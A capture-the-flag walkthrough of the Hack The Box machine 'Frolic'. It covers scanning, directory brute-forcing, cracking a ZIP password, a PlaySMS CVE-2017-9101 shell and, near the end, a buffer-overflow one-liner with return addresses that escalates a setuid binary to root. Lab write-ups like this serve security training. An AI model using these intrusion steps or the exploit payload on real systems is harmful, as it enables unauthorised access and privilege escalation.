# [Frolic](https://app.hackthebox.com/machines/frolic)

```bash
rustscan 10.10.10.111 --ulimit 5000 -b 2000
```
![Alt text](img/image.png)



Let's do nmap scan for open ports.

```bash
nmap -sC -sV -p22,139,445,1880,9999 -A 10.10.10.111 -Pn
```

![Alt text](img/image-1.png)

Here, we see SMB port is open on target, let's do `smbmap` to see shares on SMB

```bash
smbmap -H 10.10.10.111
```

![Alt text](img/image-2.png)


From result, we see that we don't have any access to shares.

On port 9999, we have nginx server, let's do directory brute-force here.

```bash
gobuster dir -u http://10.10.10.111:9999/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,js
```

![Alt text](img/image-5.png)


On '/backup' directory, we see some interesting stuff.

![Alt text](img/image-3.png)


While we curl for 'user.txt' and 'password.txt' for backup directory. We see that we have some credentials.

![Alt text](img/image-4.png)


admin: imnothuman

We can see '/admin' panel that have login page. Let's try to login with default credentials.

![Alt text](img/image-9.png)



Let's do directory brute-force for '/dev' directory.
```bash
gobuster dir -u http://10.10.10.111:9999/dev -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,js
```

![Alt text](img/image-6.png)


Let's try to curl these pages.

![Alt text](img/image-7.png)


We find 'playsms' application, on this URL.

![Alt text](img/image-8.png)



Let's look at the source page of 'admin' panel.

![Alt text](img/image-10.png)

Hola, we can see clear-text credentials on code that is **hard-coded.**


admin: superduperlooperpassword_lol

While we login with above credentials, we have success page like this.

![Alt text](img/image-11.png)


While I search this result on Google, I see that is 'Ook!' programming language.

![Alt text](img/image-12.png)


While, I use decoder for 'Ook!' programming language on [here](https://dcode.fr/ook-language)

![Alt text](img/image-13.png)


Let's check this '/asdiSIAJJ0QWE9JAS' endpoint.

Again we have some fucking text on this page.

![Alt text](img/image-14.png)


I searched on [Cyberchef](https://cyberchef.io/)

![Alt text](img/image-15.png)


It is actually ZIP file.


I download this string to my machine as ZIP file, tried to unzip this, it says me that  I need to enter password. FUCK

![Alt text](img/image-16.png)


Let's brute-force this via `fcrackzip` tool.
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt index.php.zip
```

![Alt text](img/image-17.png)


Let's unzip password, and we got again 'index.php' file, we read this file, again we have fucking long length of string.


![Alt text](img/image-18.png)


I do again Cyberchef to decode this, I have final result.

![Alt text](img/image-19.png)


I searched output on Google, I know that it is 'Brainfuck' language.

![Alt text](img/image-20.png)


Let's decode this by using 'Brainfuck' programming language.

![Alt text](img/image-21.png)


Now, I have password like this 'idkwhatispass'

I check this credentials on services which I have see before, and it works on PlaySMS

admin: idkwhatispass

![Alt text](img/image-22.png)


I searched exploit on Google for PlaySMS application, I found CVE-2017-9101.

![Alt text](img/image-23.png)


I got shell,

![Alt text](img/image-24.png)


Let's make this interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-25.png)


user.txt

![Alt text](img/image-26.png)

There , we have binary directory called '.binary'  (I find hidden directory with -a option of `ls` command)

![Alt text](img/image-28.png)

I searched exploitation for this '.rop' and find the exploit.

```bash
./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
```


root.txt

![Alt text](img/image-27.png)

